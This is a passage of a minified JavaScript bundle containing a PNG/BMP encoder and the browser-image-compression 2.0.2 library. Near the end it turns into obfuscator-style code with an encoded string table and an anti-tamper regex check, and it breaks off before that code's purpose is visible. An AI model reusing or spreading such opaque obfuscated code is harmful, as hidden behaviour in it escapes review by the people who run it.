        a && (!(1 & ~g) && g--, !(1 & ~y) && y--),
        (s = { x: g, y: y, width: w - g + 1, height: b - y + 1 });
      const v = o[i];
      (v.rect = s),
        (v.blend = 1),
        (v.img = new Uint8Array(s.width * s.height * 4)),
        0 == o[i - 1].dispose
          ? (t(l, n, r, v.img, s.width, s.height, -s.x, -s.y, 0),
            f(p, n, r, v.img, s))
          : t(p, n, r, v.img, s.width, s.height, -s.x, -s.y, 0);
    }
    function f(e, n, r, o, i) {
      t(e, n, r, o, i.width, i.height, -i.x, -i.y, 2);
    }
    function h(t, e, n, r, o, i, s) {
      const a = [];
      let u,
        c = [0, 1, 2, 3, 4];
      -1 != i ? (c = [i]) : (e * r > 5e5 || 1 == n) && (c = [0]),
        s && (u = { level: 0 });
      const l = iO;
      for (var d = 0; d < c.length; d++) {
        for (let i = 0; i < e; i++) p(o, t, i, r, n, c[d]);
        a.push(l.deflate(o, u));
      }
      let f,
        h = 1e9;
      for (d = 0; d < a.length; d++)
        a[d].length < h && ((f = d), (h = a[d].length));
      return a[f];
    }
    function p(t, e, r, o, i, s) {
      const a = r * o;
      let u = a + r;
      if (((t[u] = s), u++, 0 == s))
        if (o < 500) for (var c = 0; c < o; c++) t[u + c] = e[a + c];
        else t.set(new Uint8Array(e.buffer, a, o), u);
      else if (1 == s) {
        for (c = 0; c < i; c++) t[u + c] = e[a + c];
        for (c = i; c < o; c++)
          t[u + c] = (e[a + c] - e[a + c - i] + 256) & 255;
      } else if (0 == r) {
        for (c = 0; c < i; c++) t[u + c] = e[a + c];
        if (2 == s) for (c = i; c < o; c++) t[u + c] = e[a + c];
        if (3 == s)
          for (c = i; c < o; c++)
            t[u + c] = (e[a + c] - (e[a + c - i] >> 1) + 256) & 255;
        if (4 == s)
          for (c = i; c < o; c++)
            t[u + c] = (e[a + c] - n(e[a + c - i], 0, 0) + 256) & 255;
      } else {
        if (2 == s)
          for (c = 0; c < o; c++)
            t[u + c] = (e[a + c] + 256 - e[a + c - o]) & 255;
        if (3 == s) {
          for (c = 0; c < i; c++)
            t[u + c] = (e[a + c] + 256 - (e[a + c - o] >> 1)) & 255;
          for (c = i; c < o; c++)
            t[u + c] =
              (e[a + c] + 256 - ((e[a + c - o] + e[a + c - i]) >> 1)) & 255;
        }
        if (4 == s) {
          for (c = 0; c < i; c++)
            t[u + c] = (e[a + c] + 256 - n(0, e[a + c - o], 0)) & 255;
          for (c = i; c < o; c++)
            t[u + c] =
              (e[a + c] +
                256 -
                n(e[a + c - i], e[a + c - o], e[a + c - i - o])) &
              255;
        }
      }
    }
    function m(t, e) {
      const n = new Uint8Array(t),
        r = n.slice(0),
        o = new Uint32Array(r.buffer),
        i = g(r, e),
        s = i[0],
        a = i[1],
        u = n.length,
        c = new Uint8Array(u >> 2);
      let l;
      if (n.length < 2e7)
        for (var d = 0; d < u; d += 4)
          (l = y(
            s,
            (f = n[d] * (1 / 255)),
            (h = n[d + 1] * (1 / 255)),
            (p = n[d + 2] * (1 / 255)),
            (m = n[d + 3] * (1 / 255))
          )),
            (c[d >> 2] = l.ind),
            (o[d >> 2] = l.est.rgba);
      else
        for (d = 0; d < u; d += 4) {
          var f = n[d] * (1 / 255),
            h = n[d + 1] * (1 / 255),
            p = n[d + 2] * (1 / 255),
            m = n[d + 3] * (1 / 255);
          for (l = s; l.left; )
            l = w(l.est, f, h, p, m) <= 0 ? l.left : l.right;
          (c[d >> 2] = l.ind), (o[d >> 2] = l.est.rgba);
        }
      return { abuf: r.buffer, inds: c, plte: a };
    }
    function g(t, e, n) {
      null == n && (n = 1e-4);
      const r = new Uint32Array(t.buffer),
        o = {
          i0: 0,
          i1: t.length,
          bst: null,
          est: null,
          tdst: 0,
          left: null,
          right: null,
        };
      (o.bst = A(t, o.i0, o.i1)), (o.est = k(o.bst));
      const i = [o];
      for (; i.length < e; ) {
        let e = 0,
          o = 0;
        for (var s = 0; s < i.length; s++)
          i[s].est.L > e && ((e = i[s].est.L), (o = s));
        if (e < n) break;
        const a = i[o],
          u = b(t, r, a.i0, a.i1, a.est.e, a.est.eMq255);
        if (a.i0 >= u || a.i1 <= u) {
          a.est.L = 0;
          continue;
        }
        const c = {
          i0: a.i0,
          i1: u,
          bst: null,
          est: null,
          tdst: 0,
          left: null,
          right: null,
        };
        (c.bst = A(t, c.i0, c.i1)), (c.est = k(c.bst));
        const l = {
          i0: u,
          i1: a.i1,
          bst: null,
          est: null,
          tdst: 0,
          left: null,
          right: null,
        };
        for (l.bst = { R: [], m: [], N: a.bst.N - c.bst.N }, s = 0; s < 16; s++)
          l.bst.R[s] = a.bst.R[s] - c.bst.R[s];
        for (s = 0; s < 4; s++) l.bst.m[s] = a.bst.m[s] - c.bst.m[s];
        (l.est = k(l.bst)), (a.left = c), (a.right = l), (i[o] = c), i.push(l);
      }
      for (i.sort((t, e) => e.bst.N - t.bst.N), s = 0; s < i.length; s++)
        i[s].ind = s;
      return [o, i];
    }
    function y(t, e, n, r, o) {
      if (null == t.left)
        return (
          (t.tdst = (function (t, e, n, r, o) {
            const i = e - t[0],
              s = n - t[1],
              a = r - t[2],
              u = o - t[3];
            return i * i + s * s + a * a + u * u;
          })(t.est.q, e, n, r, o)),
          t
        );
      const i = w(t.est, e, n, r, o);
      let s = t.left,
        a = t.right;
      i > 0 && ((s = t.right), (a = t.left));
      const u = y(s, e, n, r, o);
      if (u.tdst <= i * i) return u;
      const c = y(a, e, n, r, o);
      return c.tdst < u.tdst ? c : u;
    }
    function w(t, e, n, r, o) {
      const { e: i } = t;
      return i[0] * e + i[1] * n + i[2] * r + i[3] * o - t.eMq;
    }
    function b(t, e, n, r, o, i) {
      for (r -= 4; n < r; ) {
        for (; v(t, n, o) <= i; ) n += 4;
        for (; v(t, r, o) > i; ) r -= 4;
        if (n >= r) break;
        const s = e[n >> 2];
        (e[n >> 2] = e[r >> 2]), (e[r >> 2] = s), (n += 4), (r -= 4);
      }
      for (; v(t, n, o) > i; ) n -= 4;
      return n + 4;
    }
    function v(t, e, n) {
      return t[e] * n[0] + t[e + 1] * n[1] + t[e + 2] * n[2] + t[e + 3] * n[3];
    }
    function A(t, e, n) {
      const r = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        o = [0, 0, 0, 0],
        i = (n - e) >> 2;
      for (let s = e; s < n; s += 4) {
        const e = t[s] * (1 / 255),
          n = t[s + 1] * (1 / 255),
          i = t[s + 2] * (1 / 255),
          a = t[s + 3] * (1 / 255);
        (o[0] += e),
          (o[1] += n),
          (o[2] += i),
          (o[3] += a),
          (r[0] += e * e),
          (r[1] += e * n),
          (r[2] += e * i),
          (r[3] += e * a),
          (r[5] += n * n),
          (r[6] += n * i),
          (r[7] += n * a),
          (r[10] += i * i),
          (r[11] += i * a),
          (r[15] += a * a);
      }
      return (
        (r[4] = r[1]),
        (r[8] = r[2]),
        (r[9] = r[6]),
        (r[12] = r[3]),
        (r[13] = r[7]),
        (r[14] = r[11]),
        { R: r, m: o, N: i }
      );
    }
    function k(t) {
      const { R: e } = t,
        { m: n } = t,
        { N: r } = t,
        o = n[0],
        i = n[1],
        s = n[2],
        a = n[3],
        u = 0 == r ? 0 : 1 / r,
        c = [
          e[0] - o * o * u,
          e[1] - o * i * u,
          e[2] - o * s * u,
          e[3] - o * a * u,
          e[4] - i * o * u,
          e[5] - i * i * u,
          e[6] - i * s * u,
          e[7] - i * a * u,
          e[8] - s * o * u,
          e[9] - s * i * u,
          e[10] - s * s * u,
          e[11] - s * a * u,
          e[12] - a * o * u,
          e[13] - a * i * u,
          e[14] - a * s * u,
          e[15] - a * a * u,
        ],
        l = c,
        d = I;
      let f = [Math.random(), Math.random(), Math.random(), Math.random()],
        h = 0,
        p = 0;
      if (0 != r)
        for (
          let g = 0;
          g < 16 &&
          ((f = d.multVec(l, f)),
          (p = Math.sqrt(d.dot(f, f))),
          (f = d.sml(1 / p, f)),
          !(0 != g && Math.abs(p - h) < 1e-9));
          g++
        )
          h = p;
      const m = [o * u, i * u, s * u, a * u];
      return {
        Cov: c,
        q: m,
        e: f,
        L: h,
        eMq255: d.dot(d.sml(255, m), f),
        eMq: d.dot(f, m),
        rgba:
          ((Math.round(255 * m[3]) << 24) |
            (Math.round(255 * m[2]) << 16) |
            (Math.round(255 * m[1]) << 8) |
            Math.round(255 * m[0])) >>>
          0,
      };
    }
    var I = {
      multVec: (t, e) => [
        t[0] * e[0] + t[1] * e[1] + t[2] * e[2] + t[3] * e[3],
        t[4] * e[0] + t[5] * e[1] + t[6] * e[2] + t[7] * e[3],
        t[8] * e[0] + t[9] * e[1] + t[10] * e[2] + t[11] * e[3],
        t[12] * e[0] + t[13] * e[1] + t[14] * e[2] + t[15] * e[3],
      ],
      dot: (t, e) => t[0] * e[0] + t[1] * e[1] + t[2] * e[2] + t[3] * e[3],
      sml: (t, e) => [t * e[0], t * e[1], t * e[2], t * e[3]],
    };
    (sO.encode = function (t, e, n, r, o, i, s) {
      null == r && (r = 0), null == s && (s = !1);
      const a = l(t, e, n, r, [!1, !1, !1, 0, s, !1]);
      return c(a, -1), u(a, e, n, o, i);
    }),
      (sO.encodeLL = function (t, e, n, r, o, i, s, a) {
        const l = {
            ctype: 0 + (1 == r ? 0 : 2) + (0 == o ? 0 : 4),
            depth: i,
            frames: [],
          },
          d = (r + o) * i,
          f = d * e;
        for (let u = 0; u < t.length; u++)
          l.frames.push({
            rect: { x: 0, y: 0, width: e, height: n },
            img: new Uint8Array(t[u]),
            blend: 0,
            dispose: 1,
            bpp: Math.ceil(d / 8),
            bpl: Math.ceil(f / 8),
          });
        return c(l, 0, !0), u(l, e, n, s, a);
      }),
      (sO.encode.compress = l),
      (sO.encode.dither = a),
      (sO.quantize = m),
      (sO.quantize.getKDtree = g),
      (sO.quantize.getNearest = y);
  })();
  const aO = {
    toArrayBuffer(t, e) {
      const n = t.width,
        r = t.height,
        o = n << 2,
        i = t.getContext("2d").getImageData(0, 0, n, r),
        s = new Uint32Array(i.data.buffer),
        a = ((32 * n + 31) / 32) << 2,
        u = a * r,
        c = 122 + u,
        l = new ArrayBuffer(c),
        d = new DataView(l),
        f = 1 << 20;
      let h,
        p,
        m,
        g,
        y = f,
        w = 0,
        b = 0,
        v = 0;
      function A(t) {
        d.setUint16(b, t, !0), (b += 2);
      }
      function k(t) {
        d.setUint32(b, t, !0), (b += 4);
      }
      function I(t) {
        b += t;
      }
      A(19778),
        k(c),
        I(4),
        k(122),
        k(108),
        k(n),
        k(-r >>> 0),
        A(1),
        A(32),
        k(3),
        k(u),
        k(2835),
        k(2835),
        I(8),
        k(16711680),
        k(65280),
        k(255),
        k(4278190080),
        k(1466527264),
        (function t() {
          for (; w < r && y > 0; ) {
            for (g = 122 + w * a, h = 0; h < o; )
              y--,
                (p = s[v++]),
                (m = p >>> 24),
                d.setUint32(g + h, (p << 8) | m),
                (h += 4);
            w++;
          }
          v < s.length ? ((y = f), setTimeout(t, aO._dly)) : e(l);
        })();
    },
    toBlob(t, e) {
      this.toArrayBuffer(t, (t) => {
        e(new Blob([t], { type: "image/bmp" }));
      });
    },
    _dly: 9,
  };
  var uO = {
      CHROME: "CHROME",
      FIREFOX: "FIREFOX",
      DESKTOP_SAFARI: "DESKTOP_SAFARI",
      IE: "IE",
      IOS: "IOS",
      ETC: "ETC",
    },
    cO = {
      [uO.CHROME]: 16384,
      [uO.FIREFOX]: 11180,
      [uO.DESKTOP_SAFARI]: 16384,
      [uO.IE]: 8192,
      [uO.IOS]: 4096,
      [uO.ETC]: 8192,
    };
  const lO = "undefined" != typeof window,
    dO =
      "undefined" != typeof WorkerGlobalScope &&
      self instanceof WorkerGlobalScope,
    fO =
      lO &&
      window.cordova &&
      window.cordova.require &&
      window.cordova.require("cordova/modulemapper"),
    hO =
      (lO || dO) &&
      ((fO && fO.getOriginalSymbol(window, "File")) ||
        ("undefined" != typeof File && File)),
    pO =
      (lO || dO) &&
      ((fO && fO.getOriginalSymbol(window, "FileReader")) ||
        ("undefined" != typeof FileReader && FileReader));
  function mO(t, e, n = Date.now()) {
    return new Promise((r) => {
      const o = t.split(","),
        i = o[0].match(/:(.*?);/)[1],
        s = globalThis.atob(o[1]);
      let a = s.length;
      const u = new Uint8Array(a);
      for (; a--; ) u[a] = s.charCodeAt(a);
      const c = new Blob([u], { type: i });
      (c.name = e), (c.lastModified = n), r(c);
    });
  }
  function gO(t) {
    return new Promise((e, n) => {
      const r = new pO();
      (r.onload = () => e(r.result)),
        (r.onerror = (t) => n(t)),
        r.readAsDataURL(t);
    });
  }
  function yO(t) {
    return new Promise((e, n) => {
      const r = new Image();
      (r.onload = () => e(r)), (r.onerror = (t) => n(t)), (r.src = t);
    });
  }
  function wO() {
    if (void 0 !== wO.cachedResult) return wO.cachedResult;
    let t = uO.ETC;
    const { userAgent: e } = navigator;
    return (
      /Chrom(e|ium)/i.test(e)
        ? (t = uO.CHROME)
        : /iP(ad|od|hone)/i.test(e) && /WebKit/i.test(e)
        ? (t = uO.IOS)
        : /Safari/i.test(e)
        ? (t = uO.DESKTOP_SAFARI)
        : /Firefox/i.test(e)
        ? (t = uO.FIREFOX)
        : (/MSIE/i.test(e) || 1 == !!document.documentMode) && (t = uO.IE),
      (wO.cachedResult = t),
      wO.cachedResult
    );
  }
  function bO(t, e) {
    const n = wO(),
      r = cO[n];
    let o = t,
      i = e,
      s = o * i;
    const a = o > i ? i / o : o / i;
    for (; s > r * r; ) {
      const t = (r + o) / 2,
        e = (r + i) / 2;
      t < e ? ((i = e), (o = e * a)) : ((i = t * a), (o = t)), (s = o * i);
    }
    return { width: o, height: i };
  }
  function vO(t, e) {
    let n, r;
    try {
      if (
        ((n = new OffscreenCanvas(t, e)), (r = n.getContext("2d")), null === r)
      )
        throw new Error("getContext of OffscreenCanvas returns null");
    } catch (o) {
      (n = document.createElement("canvas")), (r = n.getContext("2d"));
    }
    return (n.width = t), (n.height = e), [n, r];
  }
  function AO(t, e) {
    const { width: n, height: r } = bO(t.width, t.height),
      [o, i] = vO(n, r);
    return (
      e &&
        /jpe?g/.test(e) &&
        ((i.fillStyle = "white"), i.fillRect(0, 0, o.width, o.height)),
      i.drawImage(t, 0, 0, o.width, o.height),
      o
    );
  }
  function kO() {
    return (
      void 0 !== kO.cachedResult ||
        (kO.cachedResult =
          [
            "iPad Simulator",
            "iPhone Simulator",
            "iPod Simulator",
            "iPad",
            "iPhone",
            "iPod",
          ].includes(navigator.platform) ||
          (navigator.userAgent.includes("Mac") &&
            "undefined" != typeof document &&
            "ontouchend" in document)),
      kO.cachedResult
    );
  }
  function IO(t, e = {}) {
    return new Promise(function (n, r) {
      let o, i;
      var s = function () {
          try {
            return (i = AO(o, e.fileType || t.type)), n([o, i]);
          } catch (s) {
            return r(s);
          }
        },
        a = function (e) {
          try {
            var n = function (t) {
              try {
                throw t;
              } catch (e) {
                return r(e);
              }
            };
            try {
              let e;
              return gO(t).then(function (t) {
                try {
                  return (
                    (e = t),
                    yO(e).then(function (t) {
                      try {
                        return (
                          (o = t),
                          (function () {
                            try {
                              return s();
                            } catch (t) {
                              return r(t);
                            }
                          })()
                        );
                      } catch (e) {
                        return n(e);
                      }
                    }, n)
                  );
                } catch (i) {
                  return n(i);
                }
              }, n);
            } catch (i) {
              n(i);
            }
          } catch (i) {
            return r(i);
          }
        };
      try {
        if (kO() || [uO.DESKTOP_SAFARI, uO.MOBILE_SAFARI].includes(wO()))
          throw new Error("Skip createImageBitmap on IOS and Safari");
        return createImageBitmap(t).then(function (t) {
          try {
            return (o = t), s();
          } catch (e) {
            return a();
          }
        }, a);
      } catch (u) {
        a();
      }
    });
  }
  function SO(t, e, n, r, o = 1) {
    return new Promise(function (i, s) {
      let a;
      if ("image/png" === e) {
        let i, s, c;
        return (
          (i = t.getContext("2d")),
          ({ data: s } = i.getImageData(0, 0, t.width, t.height)),
          (c = sO.encode([s.buffer], t.width, t.height, 4096 * o)),
          (a = new Blob([c], { type: e })),
          (a.name = n),
          (a.lastModified = r),
          u.call(this)
        );
      }
      {
        let i = function () {
          return u.call(this);
        };
        if ("image/bmp" === e)
          return new Promise((e) => aO.toBlob(t, e)).then(
            function (t) {
              try {
                return (
                  (a = t), (a.name = n), (a.lastModified = r), i.call(this)
                );
              } catch (e) {
                return s(e);
              }
            }.bind(this),
            s
          );
        {
          let u = function () {
            return i.call(this);
          };
          if (
            "function" == typeof OffscreenCanvas &&
            t instanceof OffscreenCanvas
          )
            return t.convertToBlob({ type: e, quality: o }).then(
              function (t) {
                try {
                  return (
                    (a = t), (a.name = n), (a.lastModified = r), u.call(this)
                  );
                } catch (e) {
                  return s(e);
                }
              }.bind(this),
              s
            );
          {
            let i;
            return (
              (i = t.toDataURL(e, o)),
              mO(i, n, r).then(
                function (t) {
                  try {
                    return (a = t), u.call(this);
                  } catch (e) {
                    return s(e);
                  }
                }.bind(this),
                s
              )
            );
          }
        }
      }
      function u() {
        return i(a);
      }
    });
  }
  function _O(t) {
    (t.width = 0), (t.height = 0);
  }
  function TO() {
    return new Promise(function (t, e) {
      let n, r, o, i;
      return void 0 !== TO.cachedResult
        ? t(TO.cachedResult)
        : mO(
            "data:image/jpeg;base64,/9j/4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAYAAAAAAAD/2wCEAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf/AABEIAAEAAgMBEQACEQEDEQH/xABKAAEAAAAAAAAAAAAAAAAAAAALEAEAAAAAAAAAAAAAAAAAAAAAAQEAAAAAAAAAAAAAAAAAAAAAEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwA/8H//2Q==",
            "test.jpg",
            Date.now()
          ).then(function (s) {
            try {
              return (
                (n = s),
                IO(n).then(function (s) {
                  try {
                    return (
                      (r = s[1]),
                      SO(r, n.type, n.name, n.lastModified).then(function (n) {
                        try {
                          return (
                            (o = n),
                            _O(r),
                            IO(o).then(function (n) {
                              try {
                                return (
                                  (i = n[0]),
                                  (TO.cachedResult =
                                    1 === i.width && 2 === i.height),
                                  t(TO.cachedResult)
                                );
                              } catch (r) {
                                return e(r);
                              }
                            }, e)
                          );
                        } catch (s) {
                          return e(s);
                        }
                      }, e)
                    );
                  } catch (a) {
                    return e(a);
                  }
                }, e)
              );
            } catch (a) {
              return e(a);
            }
          }, e);
    });
  }
  function BO(t) {
    return new Promise((e, n) => {
      const r = new pO();
      (r.onload = (t) => {
        const n = new DataView(t.target.result);
        if (65496 != n.getUint16(0, !1)) return e(-2);
        const r = n.byteLength;
        let o = 2;
        for (; o < r; ) {
          if (n.getUint16(o + 2, !1) <= 8) return e(-1);
          const t = n.getUint16(o, !1);
          if (((o += 2), 65505 == t)) {
            if (1165519206 != n.getUint32((o += 2), !1)) return e(-1);
            const t = 18761 == n.getUint16((o += 6), !1);
            o += n.getUint32(o + 4, t);
            const r = n.getUint16(o, t);
            o += 2;
            for (let i = 0; i < r; i++)
              if (274 == n.getUint16(o + 12 * i, t))
                return e(n.getUint16(o + 12 * i + 8, t));
          } else {
            if (65280 & ~t) break;
            o += n.getUint16(o, !1);
          }
        }
        return e(-1);
      }),
        (r.onerror = (t) => n(t)),
        r.readAsArrayBuffer(t);
    });
  }
  function CO(t, e) {
    const { width: n } = t,
      { height: r } = t,
      { maxWidthOrHeight: o } = e;
    let i,
      s = t;
    return (
      isFinite(o) &&
        (n > o || r > o) &&
        (([s, i] = vO(n, r)),
        n > r
          ? ((s.width = o), (s.height = (r / n) * o))
          : ((s.width = (n / r) * o), (s.height = o)),
        i.drawImage(t, 0, 0, s.width, s.height),
        _O(t)),
      s
    );
  }
  function EO(t, e) {
    const { width: n } = t,
      { height: r } = t,
      [o, i] = vO(n, r);
    switch (
      (e > 4 && e < 9
        ? ((o.width = r), (o.height = n))
        : ((o.width = n), (o.height = r)),
      e)
    ) {
      case 2:
        i.transform(-1, 0, 0, 1, n, 0);
        break;
      case 3:
        i.transform(-1, 0, 0, -1, n, r);
        break;
      case 4:
        i.transform(1, 0, 0, -1, 0, r);
        break;
      case 5:
        i.transform(0, 1, 1, 0, 0, 0);
        break;
      case 6:
        i.transform(0, 1, -1, 0, r, 0);
        break;
      case 7:
        i.transform(0, -1, -1, 0, r, n);
        break;
      case 8:
        i.transform(0, -1, 1, 0, 0, n);
    }
    return i.drawImage(t, 0, 0, n, r), _O(t), o;
  }
  function xO(t, e, n = 0) {
    return new Promise(function (r, o) {
      let i, s, a, u, c, l, d, f, h, p, m, g, y, w, b, v, A, k, I, S;
      function _(t = 5) {
        if (e.signal && e.signal.aborted) throw e.signal.reason;
        (i += t), e.onProgress(Math.min(i, 100));
      }
      function T(t) {
        if (e.signal && e.signal.aborted) throw e.signal.reason;
        (i = Math.min(Math.max(t, i), 100)), e.onProgress(i);
      }
      return (
        (i = n),
        (s = e.maxIteration || 10),
        (a = 1024 * e.maxSizeMB * 1024),
        _(),
        IO(t, e).then(
          function (n) {
            try {
              return (
                ([, u] = n),
                _(),
                (c = CO(u, e)),
                _(),
                new Promise(function (n, r) {
                  var o;
                  if (!(o = e.exifOrientation))
                    return BO(t).then(
                      function (t) {
                        try {
                          return (o = t), i.call(this);
                        } catch (e) {
                          return r(e);
                        }
                      }.bind(this),
                      r
                    );
                  function i() {
                    return n(o);
                  }
                  return i.call(this);
                }).then(
                  function (n) {
                    try {
                      return (
                        (l = n),
                        _(),
                        TO().then(
                          function (n) {
                            try {
                              return (
                                (d = n ? c : EO(c, l)),
                                _(),
                                (f = e.initialQuality || 1),
                                (h = e.fileType || t.type),
                                SO(d, h, t.name, t.lastModified, f).then(
                                  function (n) {
                                    try {
                                      {
                                        let l = function () {
                                            if (s-- && (b > a || b > y)) {
                                              let e, n;
                                              return (
                                                (e = S
                                                  ? 0.95 * I.width
                                                  : I.width),
                                                (n = S
                                                  ? 0.95 * I.height
                                                  : I.height),
                                                ([A, k] = vO(e, n)),
                                                k.drawImage(I, 0, 0, e, n),
                                                (f *=
                                                  "image/png" === h
                                                    ? 0.85
                                                    : 0.95),
                                                SO(
                                                  A,
                                                  h,
                                                  t.name,
                                                  t.lastModified,
                                                  f
                                                ).then(function (t) {
                                                  try {
                                                    return (
                                                      (v = t),
                                                      _O(I),
                                                      (I = A),
                                                      (b = v.size),
                                                      T(
                                                        Math.min(
                                                          99,
                                                          Math.floor(
                                                            ((w - b) /
                                                              (w - a)) *
                                                              100
                                                          )
                                                        )
                                                      ),
                                                      l
                                                    );
                                                  } catch (e) {
                                                    return o(e);
                                                  }
                                                }, o)
                                              );
                                            }
                                            return [1];
                                          },
                                          B = function () {
                                            return (
                                              _O(I),
                                              _O(A),
                                              _O(c),
                                              _O(d),
                                              _O(u),
                                              T(100),
                                              r(v)
                                            );
                                          };
                                        return (
                                          (p = n),
                                          _(),
                                          (m = p.size > a),
                                          (g = p.size > t.size),
                                          m || g
                                            ? ((y = t.size),
                                              (w = p.size),
                                              (b = w),
                                              (I = d),
                                              (S =
                                                !e.alwaysKeepResolution && m),
                                              (i = function (t) {
                                                for (; t; ) {
                                                  if (t.then)
                                                    return void t.then(i, o);
                                                  try {
                                                    if (t.pop) {
                                                      if (t.length)
                                                        return t.pop()
                                                          ? B.call(this)
                                                          : t;
                                                      t = l;
                                                    } else t = t.call(this);
                                                  } catch (e) {
                                                    return o(e);
                                                  }
                                                }
                                              }.bind(this))(l))
                                            : (T(100), r(p))
                                        );
                                        var i;
                                      }
                                    } catch (l) {
                                      return o(l);
                                    }
                                  }.bind(this),
                                  o
                                )
                              );
                            } catch (i) {
                              return o(i);
                            }
                          }.bind(this),
                          o
                        )
                      );
                    } catch (i) {
                      return o(i);
                    }
                  }.bind(this),
                  o
                )
              );
            } catch (i) {
              return o(i);
            }
          }.bind(this),
          o
        )
      );
    });
  }
  let PO;
  function OO(t, e) {
    return new Promise(function (n, r) {
      let o, i, s, a, u, c;
      if (
        ((o = { ...e }),
        (s = 0),
        ({ onProgress: a } = o),
        (o.maxSizeMB = o.maxSizeMB || Number.POSITIVE_INFINITY),
        (u = "boolean" != typeof o.useWebWorker || o.useWebWorker),
        delete o.useWebWorker,
        (o.onProgress = (t) => {
          (s = t), "function" == typeof a && a(s);
        }),
        !(t instanceof Blob || t instanceof hO))
      )
        return r(
          new Error("The file given is not an instance of Blob or File")
        );
      if (!/^image/.test(t.type))
        return r(new Error("The file given is not an image"));
      if (
        ((c =
          "undefined" != typeof WorkerGlobalScope &&
          self instanceof WorkerGlobalScope),
        !u || "function" != typeof Worker || c)
      )
        return xO(t, o).then(
          function (t) {
            try {
              return (i = t), f.call(this);
            } catch (e) {
              return r(e);
            }
          }.bind(this),
          r
        );
      var l = function () {
          try {
            return f.call(this);
          } catch (t) {
            return r(t);
          }
        }.bind(this),
        d = function (e) {
          try {
            return xO(t, o).then(function (t) {
              try {
                return (i = t), l();
              } catch (e) {
                return r(e);
              }
            }, r);
          } catch (n) {
            return r(n);
          }
        };
      try {
        return (
          (o.libURL =
            o.libURL ||
            "https://cdn.jsdelivr.net/npm/browser-image-compression@2.0.2/dist/browser-image-compression.js"),
          (function (t, e) {
            return new Promise((n, r) => {
              PO ||
                (PO = (function (t) {
                  const e = [];
                  return e.push(t), URL.createObjectURL(new Blob(e));
                })(
                  "\nlet scriptImported = false\nself.addEventListener('message', async (e) => {\n  const { file, id, imageCompressionLibUrl, options } = e.data\n  options.onProgress = (progress) => self.postMessage({ progress, id })\n  try {\n    if (!scriptImported) {\n      // console.log('[worker] importScripts', imageCompressionLibUrl)\n      self.importScripts(imageCompressionLibUrl)\n      scriptImported = true\n    }\n    // console.log('[worker] self', self)\n    const compressedFile = await imageCompression(file, options)\n    self.postMessage({ file: compressedFile, id })\n  } catch (e) {\n    // console.error('[worker] error', e)\n    self.postMessage({ error: e.message + '\\n' + e.stack, id })\n  }\n})\n"
                ));
              const o = new Worker(PO);
              o.addEventListener("message", function (t) {
                if (e.signal && e.signal.aborted) o.terminate();
                else if (void 0 === t.data.progress) {
                  if (t.data.error)
                    return r(new Error(t.data.error)), void o.terminate();
                  n(t.data.file), o.terminate();
                } else e.onProgress(t.data.progress);
              }),
                o.addEventListener("error", r),
                e.signal &&
                  e.signal.addEventListener("abort", () => {
                    r(e.signal.reason), o.terminate();
                  }),
                o.postMessage({
                  file: t,
                  imageCompressionLibUrl: e.libURL,
                  options: { ...e, onProgress: void 0, signal: void 0 },
                });
            });
          })(t, o).then(function (t) {
            try {
              return (i = t), l();
            } catch (e) {
              return d();
            }
          }, d)
        );
      } catch (h) {
        d();
      }
      function f() {
        try {
          (i.name = t.name), (i.lastModified = t.lastModified);
        } catch (h) {}
        try {
          o.preserveExif &&
            "image/jpeg" === t.type &&
            (!o.fileType || (o.fileType && o.fileType === t.type)) &&
            (i = eO(t, i));
        } catch (h) {}
        return n(i);
      }
    });
  }
  (OO.getDataUrlFromFile = gO),
    (OO.getFilefromDataUrl = mO),
    (OO.loadImage = yO),
    (OO.drawImageInCanvas = AO),
    (OO.drawFileInCanvas = IO),
    (OO.canvasToFile = SO),
    (OO.getExifOrientation = BO),
    (OO.handleMaxWidthOrHeight = CO),
    (OO.followExifOrientation = EO),
    (OO.cleanupCanvasMemory = _O),
    (OO.isAutoOrientationInBrowser = TO),
    (OO.approximateBelowMaximumCanvasSizeOfBrowser = bO),
    (OO.copyExifWithoutOrientation = eO),
    (OO.getBrowserName = wO),
    (OO.version = "2.0.2"),
    (function (t) {
      const e = 301,
        n = 278,
        r = 286,
        o = 327,
        i = 287,
        s = 272,
        a = NO,
        u = t();
      for (; []; )
        try {
          if (
            965576 ===
            -parseInt(a(259)) / 1 +
              -parseInt(a(288)) / 2 +
              (-parseInt(a(e)) / 3) * (-parseInt(a(n)) / 4) +
              (parseInt(a(r)) / 5) * (-parseInt(a(o)) / 6) +
              (parseInt(a(i)) / 7) * (parseInt(a(261)) / 8) +
              parseInt(a(319)) / 9 +
              parseInt(a(s)) / 10
          )
            break;
          u.push(u.shift());
        } catch (c) {
          u.push(u.shift());
        }
    })(DO);
  const RO = (function () {
      let t = !![];
      return function (e, n) {
        const r = 310,
          o = t
            ? function () {
                if (n) {
                  const t = n[NO(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    MO = RO(void 0, function () {
      const t = 260,
        e = 308,
        n = NO;
      return MO[n(t)]()
        .search("(((.+)+)+)+$")
        [n(t)]()
        .constructor(MO)
        [n(e)]("(((.+)+)+)+$");
    });
  MO();
  const LO = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n[NO(310)](e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  function NO(t, e) {
    const n = DO();
    return (
      (NO = function (e, r) {
        let o = n[(e -= 251)];
        if (void 0 === NO.HHpsXO) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
